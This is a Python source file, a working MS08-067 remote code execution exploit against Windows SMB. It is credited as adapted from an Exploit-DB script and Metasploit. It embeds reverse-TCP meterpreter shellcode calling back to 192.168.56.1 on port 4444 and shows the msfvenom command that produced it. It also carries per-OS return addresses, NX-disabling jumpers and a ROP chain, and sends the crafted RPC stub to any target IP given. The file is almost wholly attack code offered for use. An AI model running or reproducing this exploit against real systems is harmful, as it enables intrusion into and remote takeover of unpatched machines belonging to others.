import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc import transport

except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print '#######################################################################'
print '#   MS08-067 Exploit'
print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
print '#######################################################################\n'


# Reverse TCP shellcode from metasploit; port 4444 IP 192.168.56.1; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
# Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
# EXITFUNC=thread Important!
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c
shellcode = (
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x29\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x43\xd2\x38\x4c\x83\xee\xfc\xe2\xf4\xbf\x3a\xba\x4c\x43\xd2"
"\x58\xc5\xa6\xe3\xf8\x28\xc8\x82\x08\xc7\x11\xde\xb3\x1e\x57"
"\x59\x4a\x64\x4c\x65\x72\x6a\x72\x2d\x94\x70\x22\xae\x3a\x60"
"\x63\x13\xf7\x41\x42\x15\xda\xbe\x11\x85\xb3\x1e\x53\x59\x72"
"\x70\xc8\x9e\x29\x34\xa0\x9a\x39\x9d\x12\x59\x61\x6c\x42\x01"
"\xb3\x05\x5b\x31\x02\x05\xc8\xe6\xb3\x4d\x95\xe3\xc7\xe0\x82"
"\x1d\x35\x4d\x84\xea\xd8\x39\xb5\xd1\x45\xb4\x78\xaf\x1c\x39"
"\xa7\x8a\xb3\x14\x67\xd3\xeb\x2a\xc8\xde\x73\xc7\x1b\xce\x39"
"\x9f\xc8\xd6\xb3\x4d\x93\x5b\x7c\x68\x67\x89\x63\x2d\x1a\x88"
"\x69\xb3\xa3\x8d\x67\x16\xc8\xc0\xd3\xc1\x1e\xba\x0b\x7e\x43"
"\xd2\x50\x3b\x30\xe0\x67\x18\x2b\x9e\x4f\x6a\x44\x2d\xed\xf4"
"\xd3\xd3\x38\x4c\x6a\x16\x6c\x1c\x2b\xfb\xb8\x27\x43\x2d\xed"
"\x26\x46\xba\x32\x47\x43\x1e\x50\x4e\x43\xd3\x83\xc5\xa5\x82"
"\x68\x1c\x13\x92\x68\x0c\x13\xba\xd2\x43\x9c\x32\xc7\x99\xd4"
"\xb8\x28\x1a\x14\xba\xa1\xe9\x37\xb3\xc7\x99\xc6\x12\x4c\x46"
"\xbc\x9c\x30\x39\xaf\x3a\x59\x4c\x43\xd2\x52\x4c\x29\xd6\x6e"
"\x1b\x2b\xd0\xe1\x84\x1c\x2d\xed\xcf\xbb\xd2\x46\x7a\xc8\xe4"
"\x52\x0c\x2b\xd2\x28\x4c\x43\x84\x52\x4c\x2b\x8a\x9c\x1f\xa6"
"\x2d\xed\xdf\x10\xb8\x38\x1a\x10\x85\x50\x4e\x9a\x1a\x67\xb3"
"\x96\x51\xc0\x4c\x3e\xf0\x60\x24\x43\x92\x38\x4c\x29\xd2\x68"
"\x24\x48\xfd\x37\x7c\xbc\x07\x6f\x24\x36\xbc\x75\x2d\xbc\x07"
"\x66\x12\xbc\xde\x1c\xa5\x32\x2d\xc7\xb3\x42\x11\x11\x8a\x36"
"\x15\xfb\xf7\xa3\xcf\x12\x46\x2b\x74\xad\xf1\xde\x2d\xed\x70"
"\x45\xae\x32\xcc\xb8\x32\x4d\x49\xf8\x95\x2b\x3e\x2c\xb8\x38"
"\x1f\xbc\x07\x38\x4c"
)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[-]Initiating connection'
        self.__trans = transport.DCERPCTransportFactory(
            'ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub = server + "\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(5)
        print 'Exploit finish\n'

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
       except IndexError:
                print '\nUsage: %s <target ip>\n' % sys.argv[0]
                print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 3 for Windows 2003 SP0 Universal\n'
                print 'Example: MS08_067.py 192.168.1.1 4 for Windows 2003 SP1 English\n'
                print 'Example: MS08_067.py 192.168.1.1 5 for Windows XP SP3 French (NX)\n'
                print 'Example: MS08_067.py 192.168.1.1 6 for Windows XP SP3 English (NX)\n'
                print 'Example: MS08_067.py 192.168.1.1 7 for Windows XP SP3 English (AlwaysOn NX)\n'
                sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()





